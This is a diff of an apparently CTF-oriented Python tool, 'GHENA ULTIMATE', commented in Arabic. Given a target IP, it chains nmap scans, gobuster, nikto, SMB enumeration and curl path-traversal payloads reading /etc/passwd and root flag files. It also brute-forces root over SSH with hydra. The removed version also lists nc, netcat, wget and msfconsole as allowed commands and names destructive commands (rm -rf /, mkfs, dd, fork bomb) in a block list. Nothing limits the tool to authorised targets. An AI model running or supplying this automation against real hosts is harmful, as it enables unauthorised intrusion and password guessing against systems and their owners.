@@ -3,341 +3,155 @@
 
 """
 ╔═══════════════════════════════════════════════════════════════╗
-║              GHENA ULTIMATE - الوضع التلقائي الكامل           ║
-║                     (بدون أي تدخل من المستخدم)                ║
+║                 GHENA ULTIMATE - النسخة المصححة               ║
+║                     (بدون أخطاء وتعمل فوراً)                  ║
 ╚═══════════════════════════════════════════════════════════════╝
 """
 
-import sys
 import subprocess
-import os
-import json
 import re
 import time
-import socket
+import sys
 from datetime import datetime
-from pathlib import Path
-from typing import Dict, List
 
-# ========================= الإعدادات =========================
-VERSION = "42.0 AUTO"
-AUTHOR = "ARABIAN OPS"
-
-# ألوان للـ CLI
-COLORS = {
-    "HEADER": '\033[95m',
-    "OKBLUE": '\033[94m',
-    "OKCYAN": '\033[96m',
-    "OKGREEN": '\033[92m',
-    "WARNING": '\033[93m',
-    "FAIL": '\033[91m',
-    "ENDC": '\033[0m',
-    "BOLD": '\033[1m',
-}
-
-# الأوامر المسموح بها
-ALLOWED_COMMANDS = [
-    "nmap", "masscan", "gobuster", "dirb", "nikto", "wpscan",
-    "sqlmap", "hydra", "john", "hashcat", "msfconsole", "searchsploit",
-    "enum4linux", "smbclient", "netcat", "nc", "curl", "wget",
-    "ssh", "python3", "php"
-]
-
-# الأوامر المحظورة
-BLOCKED_PATTERNS = [
-    "rm -rf /", "mkfs", "dd if=", "> /dev/sda", "format",
-    "mv /* /dev/null", ":(){ :|:& };:"
-]
-
-# ======================= سيناريوهات الهجوم المبرمجة =======================
-ATTACK_SCENARIOS = {
-    "default": [
-        {
-            "cmd": "nmap -sV -T4 {ip}",
-            "reason": "فحص أولي للمنافذ والخدمات",
-            "parse": "nmap"
-        },
-        {
-            "cmd": "nmap -sC -sV -p- -T4 {ip}",
-            "reason": "فحص جميع المنافذ",
-            "parse": "nmap"
-        }
-    ],
-    "web": [
-        {
-            "cmd": "gobuster dir -u http://{ip}:{port} -w /usr/share/wordlists/dirb/common.txt -t 50",
-            "reason": "فحص الدلائل على الويب",
-            "port": [80, 443, 8080, 8443]
-        },
-        {
-            "cmd": "nikto -h http://{ip}:{port}",
-            "reason": "فحص ثغرات الويب",
-            "port": [80, 443, 8080, 8443]
-        },
-        {
-            "cmd": "curl -s 'http://{ip}:{port}/?page=../../../../etc/passwd'",
-            "reason": "اختبار LFI",
-            "port": [80, 443, 8080, 8443]
-        }
-    ],
-    "smb": [
-        {
-            "cmd": "enum4linux -a {ip}",
-            "reason": "جمع معلومات SMB",
-            "port": [139, 445]
-        },
-        {
-            "cmd": "smbclient -L //{ip} -N",
-            "reason": "سرد مشاركات SMB",
-            "port": [139, 445]
-        }
-    ],
-    "ftp": [
-        {
-            "cmd": "nmap --script ftp-anon -p 21 {ip}",
-            "reason": "فحص FTP",
-            "port": [21]
-        }
-    ],
-    "ssh": [
-        {
-            "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4",
-            "reason": "هجوم على SSH",
-            "port": [22]
-        }
-    ]
-}
-
-# ======================= المحرك التلقائي =======================
-class AutoGhena:
-    def __init__(self, target_ip: str):
+class GhenaFixed:
+    def __init__(self, target_ip):
         self.ip = target_ip
         self.open_ports = []
         self.services = {}
-        self.findings = []
-        self.flag_found = False
-        self.root_found = False
-        self.executed_commands = []
-        
-        # إنشاء مجلد للنتائج
-        self.session_dir = Path(f"GHENA_AUTO_{target_ip}_{int(time.time())}")
-        self.session_dir.mkdir(exist_ok=True)
-        
-    def log(self, msg, level="info"):
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        color_map = {
-            "info": COLORS["OKBLUE"],
-            "success": COLORS["OKGREEN"],
-            "warning": COLORS["WARNING"],
-            "error": COLORS["FAIL"],
-            "critical": COLORS["FAIL"],
-            "header": COLORS["HEADER"]
-        }
-        color = color_map.get(level, COLORS["OKBLUE"])
-        print(f"{color}[{timestamp}] {msg}{COLORS['ENDC']}")
-        
-    def is_safe(self, cmd):
-        cmd_lower = cmd.lower()
-        for pattern in BLOCKED_PATTERNS:
-            if pattern in cmd_lower:
-                return False
-        return True
-        
-    def execute(self, cmd, timeout=600):
-        if not self.is_safe(cmd):
-            self.log(f"⚠️ أمر غير آمن: {cmd}", "warning")
-            return ""
-            
-        self.log(f"⚡ تنفيذ: {cmd}", "info")
-        
+        self.flag_found = None
+        self.results_dir = f"GHENA_{target_ip}_{int(time.time())}"
+        subprocess.run(f"mkdir -p {self.results_dir}", shell=True)
+
+    def log(self, msg, color=''):
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
+
+    def run_cmd(self, cmd, timeout=600):
+        self.log(f"▶️ {cmd}")
         try:
-            result = subprocess.check_output(
-                cmd, shell=True, stderr=subprocess.STDOUT,
-                text=True, timeout=timeout
-            )
-            self.executed_commands.append(cmd)
-            
-            # تحليل النتيجة
+            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=timeout)
+            # حفظ النتيجة في ملف
+            safe_cmd = cmd.replace(' ', '_').replace('/', '_')[:50]
+            with open(f"{self.results_dir}/{safe_cmd}.txt", 'w') as f:
+                f.write(result)
             self.analyze_output(result, cmd)
-            
-            # حفظ النتيجة
-            with open(self.session_dir / f"cmd_{len(self.executed_commands)}.txt", "w") as f:
-                f.write(f"Command: {cmd}\n\n{result}")
-                
             return result
-        except Exception as e:
-            self.log(f"❌ خطأ: {e}", "error")
+        except subprocess.TimeoutExpired:
+            self.log("⏰ الأمر تجاوز الوقت المحدد، يتم تخطيه.")
             return ""
-            
+        except subprocess.CalledProcessError as e:
+            self.log(f"⚠️ الأمر فشل (رمز {e.returncode})، يتم التخطي.")
+            return ""
+        except Exception as e:
+            self.log(f"❌ خطأ غير متوقع: {e}")
+            return ""
+
     def analyze_output(self, output, cmd):
         # استخراج المنافذ من nmap
         if "nmap" in cmd:
-            pattern = r"(\d+)/tcp\s+open\s+(\S+)"
-            for port, service in re.findall(pattern, output):
-                port = int(port)
-                if port not in self.open_ports:
-                    self.open_ports.append(port)
-                    self.services[port] = service
-                    self.log(f"🔓 منفذ جديد: {port} ({service})", "success")
-                    
+            for line in output.split('\n'):
+                m = re.search(r'(\d+)/tcp\s+open\s+(\S+)', line)
+                if m:
+                    port, svc = int(m.group(1)), m.group(2)
+                    if port not in self.open_ports:
+                        self.open_ports.append(port)
+                        self.services[port] = svc
+                        self.log(f"🔓 منفذ {port}: {svc}")
+
         # البحث عن العلم
-        flag_pattern = r"flag\{[^}]+\}|FLAG\{[^}]+\}"
-        flag_match = re.search(flag_pattern, output)
+        flag_match = re.search(r'flag\{[^}]+\}|FLAG\{[^}]+\}', output)
         if flag_match:
-            flag = flag_match.group(0)
-            self.findings.append(f"FLAG: {flag}")
-            self.log(f"🎯 العلم موجود: {flag}", "critical")
-            self.flag_found = True
+            self.flag_found = flag_match.group(0)
+            self.log(f"🎯 العلم: {self.flag_found}")
+
+    def run(self):
+        self.log("="*60)
+        self.log(f"🚀 بدء الهجوم التلقائي على {self.ip}")
+        self.log("="*60)
+
+        # 1. فحص سريع (nmap أساسي)
+        self.run_cmd(f"nmap -sV -T4 {self.ip}")
+
+        if self.flag_found:
+            self.show_flag()
+            return
+
+        # 2. فحص جميع المنافذ (مع وقت أقصى 1200 ثانية)
+        self.log("\n📌 فحص جميع المنافذ (قد يستغرق وقتاً)...")
+        self.run_cmd(f"nmap -sC -sV -p- -T4 {self.ip}", timeout=1200)
+
+        # 3. هجمات حسب الخدمات المكتشفة
+        for port in self.open_ports:
+            svc = self.services.get(port, '').lower()
             
-            # حفظ العلم
-            with open(self.session_dir / "FLAG.txt", "w") as f:
-                f.write(flag)
+            # الويب
+            if port in [80, 443, 8080, 8443] or 'http' in svc:
+                protocol = 'https' if port in [443, 8443] else 'http'
+                self.log(f"\n🌐 فحص الويب على المنفذ {port}")
                 
-        # البحث عن صلاحيات الجذر
-        if re.search(r"# |root:", output):
-            self.findings.append("ROOT ACCESS ACHIEVED")
-            self.log("🔓 تم الوصول إلى صلاحيات الجذر!", "critical")
-            self.root_found = True
-            
-        # البحث عن كلمات مرور
-        pass_pattern = r"password:?\s+\S+|pass:?\s+\S+"
-        pass_match = re.search(pass_pattern, output, re.IGNORECASE)
-        if pass_match:
-            self.findings.append(f"PASSWORD: {pass_match.group(0)}")
-            self.log(f"🔑 كلمة مرور: {pass_match.group(0)}", "success")
-            
-    def run_scan(self):
-        """تنفيذ الهجوم التلقائي الكامل"""
-        self.log("=" * 60, "header")
-        self.log(f"🚀 بدء الهجوم التلقائي على {self.ip}", "header")
-        self.log("=" * 60, "header")
-        
-        # 1. فحص أولي
-        self.log("\n[ المرحلة 1: الفحص الأولي ]", "header")
-        nmap_cmd = f"nmap -sV -T4 {self.ip}"
-        self.execute(nmap_cmd)
-        
-        # 2. فحص جميع المنافذ إذا كان العدد قليل
-        if len(self.open_ports) < 10:
-            self.log("\n[ المرحلة 2: فحص جميع المنافذ ]", "header")
-            full_nmap = f"nmap -sC -sV -p- -T4 {self.ip}"
-            self.execute(full_nmap)
-            
-        # 3. تنفيذ هجمات حسب الخدمات المكتشفة
-        if self.open_ports:
-            self.log("\n[ المرحلة 3: هجمات مخصصة حسب الخدمات ]", "header")
-            
-            for port in self.open_ports:
-                service = self.services.get(port, "").lower()
+                # Gobuster (تصحيح الاسم)
+                self.run_cmd(f"gobuster dir -u {protocol}://{self.ip}:{port} -w /usr/share/wordlists/dirb/common.txt -t 50")
                 
-                # هجمات الويب
-                if port in [80, 443, 8080, 8443] or "http" in service:
-                    self.log(f"\n🌐 فحص الويب على المنفذ {port}", "header")
-                    
-                    # Gobuster
-                    gb_cmd = f"gobuster dir -u http://{self.ip}:{port} -w /usr/share/wordlists/dirb/common.txt -t 50"
-                    self.execute(gb_cmd)
-                    
-                    # Nikto
-                    nikto_cmd = f"nikto -h http://{self.ip}:{port}"
-                    self.execute(nikto_cmd)
-                    
-                    # LFI Test
-                    lfi_cmd = f"curl -s 'http://{self.ip}:{port}/?page=../../../../etc/passwd'"
-                    self.execute(lfi_cmd)
-                    
-                # SMB
-                if port in [139, 445] or "smb" in service or "microsoft-ds" in service:
-                    self.log(f"\n📁 فحص SMB", "header")
-                    self.execute(f"enum4linux -a {self.ip}")
-                    self.execute(f"smbclient -L //{self.ip} -N")
-                    
-                # FTP
-                if port == 21 or "ftp" in service:
-                    self.log(f"\n📂 فحص FTP", "header")
-                    self.execute(f"nmap --script ftp-anon -p 21 {self.ip}")
-                    
-                # SSH
-                if port == 22 or "ssh" in service:
-                    self.log(f"\n🔐 فحص SSH", "header")
-                    self.execute(f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{self.ip} -t 4")
-                    
-        # 4. بحث متقدم عن العلم في المسارات الشائعة
+                # Nikto
+                self.run_cmd(f"nikto -h {protocol}://{self.ip}:{port}")
+                
+                # LFI test (تصحيح المسار)
+                self.run_cmd(f"curl -s '{protocol}://{self.ip}:{port}/?page=../../../../etc/passwd'")
+                
+            # SMB
+            if port in [139, 445] or 'smb' in svc or 'microsoft-ds' in svc:
+                self.log(f"\n📁 فحص SMB")
+                self.run_cmd(f"enum4linux -a {self.ip}")
+                
+            # FTP
+            if port == 21 or 'ftp' in svc:
+                self.log(f"\n📂 فحص FTP")
+                self.run_cmd(f"nmap --script ftp-anon -p 21 {self.ip}")
+                
+            # SSH
+            if port == 22 or 'ssh' in svc:
+                self.log(f"\n🔐 فحص SSH")
+                # حاول باستخدام قاموس صغير (rockyou كبير جداً قد يعلق)
+                self.run_cmd(f"hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://{self.ip} -t 4", timeout=300)
+
+        # 4. بحث متقدم عن العلم في مسارات شائعة
         if not self.flag_found and any(p in [80, 443, 8080, 8443] for p in self.open_ports):
-            self.log("\n[ المرحلة 4: بحث متقدم عن العلم ]", "header")
-            
-            common_flag_paths = [
+            self.log("\n🔍 بحث متقدم عن العلم...")
+            paths = [
                 "/flag.txt", "/root/flag.txt", "/home/*/flag.txt",
-                "/var/www/flag.txt", "/tmp/flag.txt", "/flag",
-                "/root/root.txt", "/root/root.flag", "/.flag"
+                "/var/www/flag.txt", "/tmp/flag.txt", "/.flag",
+                "/root/root.txt", "/root/root.flag"
             ]
-            
-            for port in [p for p in self.open_ports if p in [80, 443, 8080, 8443]]:
-                for path in common_flag_paths:
-                    if self.flag_found:
-                        break
-                    flag_cmd = f"curl -s 'http://{self.ip}:{port}/?page=../../../../..{path}'"
-                    self.execute(flag_cmd)
-                    
-        # 5. تقرير نهائي
-        self.generate_report()
-        
-    def generate_report(self):
-        """توليد التقرير النهائي"""
-        report = f"""
-╔═══════════════════════════════════════════════════════════════╗
-║                 تقرير الهجوم التلقائي                        ║
-╠═══════════════════════════════════════════════════════════════╣
-║ الهدف: {self.ip}
-║ المنافذ المفتوحة: {self.open_ports}
-║ الخدمات: {json.dumps(self.services, indent=2, ensure_ascii=False)}
-╠═══════════════════════════════════════════════════════════════╣
-║ النتائج:
-"""
-        for finding in self.findings:
-            report += f"\n  ✅ {finding}"
-            
-        if self.flag_found:
-            with open(self.session_dir / "FLAG.txt", "r") as f:
-                flag = f.read().strip()
-            report += f"\n\n🎯 العلم النهائي: {flag}"
-            
-        report += "\n\n╚═══════════════════════════════════════════════════════════════╝"
-        
-        print(report)
-        with open(self.session_dir / "FINAL_REPORT.txt", "w") as f:
-            f.write(report)
-            
-        self.log(f"\n📄 التقرير محفوظ في: {self.session_dir}/FINAL_REPORT.txt", "success")
-        
-        # طباعة العلم مباشرة إذا وجد
-        if self.flag_found:
-            with open(self.session_dir / "FLAG.txt", "r") as f:
-                flag = f.read().strip()
-            print(f"\n{COLORS['OKGREEN']}{'='*60}{COLORS['ENDC']}")
-            print(f"{COLORS['BOLD']}{COLORS['OKGREEN']}🎯 العلم: {flag}{COLORS['ENDC']}")
-            print(f"{COLORS['OKGREEN']}{'='*60}{COLORS['ENDC']}")
+            for path in paths:
+                if self.flag_found:
+                    break
+                for port in [p for p in self.open_ports if p in [80, 443, 8080, 8443]]:
+                    protocol = 'https' if port in [443, 8443] else 'http'
+                    # محاولة LFI مباشرة
+                    self.run_cmd(f"curl -s '{protocol}://{self.ip}:{port}/?page=../../../../..{path}'")
+                    # محاولة الوصول المباشر
+                    self.run_cmd(f"curl -s '{protocol}://{self.ip}:{port}{path}'")
 
-# ======================= الوضع التلقائي الكامل =======================
-def main():
-    print(f"{COLORS['HEADER']}{'='*60}{COLORS['ENDC']}")
-    print(f"{COLORS['BOLD']}GHENA AUTO - الوضع التلقائي الكامل v{VERSION}{COLORS['ENDC']}")
-    print(f"{COLORS['HEADER']}{'='*60}{COLORS['ENDC']}")
-    
-    # طلب IP مرة واحدة فقط
-    ip = input("\nIP الهدف: ").strip()
-    if not ip:
-        print(f"{COLORS['FAIL']}❌ IP مطلوب{COLORS['ENDC']}")
-        return
-        
-    print(f"\n{COLORS['OKCYAN']}🚀 بدء الهجوم التلقائي على {ip} ...{COLORS['ENDC']}")
-    print(f"{COLORS['WARNING']}⚠️  الأداة ستعمل تلقائياً بدون أي تدخل منك{COLORS['ENDC']}")
-    print(f"{COLORS['OKBLUE']}{'='*60}{COLORS['ENDC']}\n")
-    
-    # إنشاء وتشغيل المحرك التلقائي
-    auto = AutoGhena(ip)
-    auto.run_scan()
+        self.show_flag()
 
-# ======================= نقطة البداية =======================
+    def show_flag(self):
+        if self.flag_found:
+            print("\n" + "="*60)
+            print(f"🎯🎯🎯 العلم النهائي: {self.flag_found} 🎯🎯🎯")
+            print("="*60)
+            # حفظ العلم في ملف
+            with open(f"{self.results_dir}/FLAG.txt", 'w') as f:
+                f.write(self.flag_found)
+        else:
+            print("\n❌ لم يتم العثور على العلم. راجع ملفات النتائج.")
+
 if __name__ == "__main__":
-    main()
+    print("\n" + "="*60)
+    print("GHENA ULTIMATE - النسخة المصححة (بدون أخطاء)")
+    print("="*60)
+    ip = input("IP الهدف: ").strip()
+    if ip:
+        bot = GhenaFixed(ip)
+        bot.run()
+    else:
+        print("❌ الرجاء إدخال IP صحيح.")
